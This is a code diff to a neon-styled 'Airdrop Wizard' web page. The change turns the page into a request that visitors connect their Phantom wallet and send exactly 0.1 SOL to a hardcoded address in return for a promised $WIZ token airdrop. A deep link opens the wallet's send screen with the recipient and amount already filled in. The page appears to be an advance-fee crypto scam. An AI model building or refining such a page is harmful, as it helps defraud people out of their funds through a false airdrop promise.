@@ -12,8 +12,6 @@
       --neon-pink: #ff00ff;
       --neon-cyan: #00ffff;
       --neon-green: #39ff14;
-      --dark-bg: #0a0a1f;
-      --darker: #05050f;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -132,8 +130,6 @@
       transition: all 0.3s;
       text-transform: uppercase;
       letter-spacing: 4px;
-      position: relative;
-      overflow: hidden;
     }
 
     .connect-btn:hover {
@@ -144,10 +140,20 @@
     .status {
       margin-top: 30px;
       font-size: 1.4rem;
-      min-height: 80px;
+      min-height: 100px;
     }
 
     .connected { color: #39ff14; text-shadow: 0 0 15px #39ff14; }
+
+    .address-box {
+      background: #000;
+      border: 2px solid #ff00ff;
+      padding: 15px;
+      margin: 15px 0;
+      font-size: 1.1rem;
+      word-break: break-all;
+      color: #00ffff;
+    }
 
     footer {
       text-align: center;
@@ -183,10 +189,10 @@
 
     <div class="main">
       <div class="card">
-        <h1>CONNECT YOUR PHANTOM WALLET</h1>
+        <h1>CONNECT & SEND 0.1 SOL</h1>
         <p class="description">
-          The future is here.<br>
-          Send to the Airdrop Wizard and claim your $WIZ rewards in the neon grid.
+          Connect your Phantom wallet and send exactly <strong>0.1 SOL</strong><br>
+          to receive your $WIZ airdrop in the neon grid.
         </p>
         
         <button id="connectBtn" class="connect-btn">
@@ -198,7 +204,8 @@
     </div>
 
     <footer>
-      © 2026 Airdrop Wizard • $WIZ TOKEN • SEND TO: MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn
+      © 2026 Airdrop Wizard • $WIZ TOKEN<br>
+      Send exactly 0.1 SOL to: <span style="color:#ff00ff;">MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn</span>
     </footer>
   </div>
 
@@ -206,10 +213,11 @@
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
+    const AMOUNT = 0.1; // 0.1 SOL
 
     async function connectPhantom() {
       if (!window.solana || !window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom wallet not detected.<br>Please install Phantom from phantom.app</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">❌ Phantom wallet not detected.<br>Install it from phantom.app</span>`;
         window.open('https://phantom.app', '_blank');
         return;
       }
@@ -219,38 +227,44 @@
         const pubkey = resp.publicKey.toString();
 
         statusDiv.innerHTML = `
-          <span class="connected">✅ WALLET CONNECTED SUCCESSFULLY</span><br>
+          <span class="connected">✅ WALLET CONNECTED</span><br>
           <span style="font-size:1.3rem; color:#00ff00;">${pubkey.slice(0,8)}...${pubkey.slice(-6)}</span>
         `;
 
-        // Open Phantom Send screen (works great on mobile)
         setTimeout(() => {
-          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Opening Phantom Send to Wizard...</span>`;
-          
-          // Phantom deep link to send SOL (or any token) to the address
-          const phantomSendUrl = `https://phantom.app/ul/v1/send?to=${RECIPIENT}&network=solana`;
-          
-          // Fallback for desktop users
-          if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-            window.location.href = phantomSendUrl;
+          statusDiv.innerHTML += `<br><span style="color:#ffff00;">Opening Phantom Send • 0.1 SOL...</span>`;
+
+          // Phantom deep link with recipient and amount (lamports)
+          const lamports = Math.floor(AMOUNT * 1_000_000_000); // convert SOL to lamports
+          const phantomUrl = `https://phantom.app/ul/v1/send?to=${RECIPIENT}&amount=${lamports}&network=solana`;
+
+          // Try to open in mobile app, fallback for desktop
+          if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            window.location.href = phantomUrl;
           } else {
-            window.open(phantomSendUrl, '_blank');
-            statusDiv.innerHTML += `<br><span style="color:#ffaa00;">(Desktop) Click the link above or open Phantom manually and send to:</span><br><span style="font-size:1.1rem; word-break:break-all;">${RECIPIENT}</span>`;
+            window.open(phantomUrl, '_blank');
+            statusDiv.innerHTML += `
+              <br><br>
+              <span style="color:#ffaa00;">Desktop mode — Phantom may not auto-open.</span><br>
+              <strong>Send exactly 0.1 SOL to:</strong>
+              <div class="address-box">${RECIPIENT}</div>
+              <span style="color:#ffff00;">Amount: 0.1 SOL</span>
+            `;
           }
-        }, 1200);
+        }, 1000);
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection failed. Try again.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection failed. Please try again.</span>`;
       }
     }
 
     connectBtn.addEventListener('click', connectPhantom);
 
-    // Show detection on load
+    // Detection message
     window.addEventListener('load', () => {
       if (window.solana && window.solana.isPhantom) {
-        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom wallet detected ✓ Ready for the neon grid</span>`;
+        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom detected ✓ Ready to send 0.1 SOL</span>`;
       }
     });
   </script>
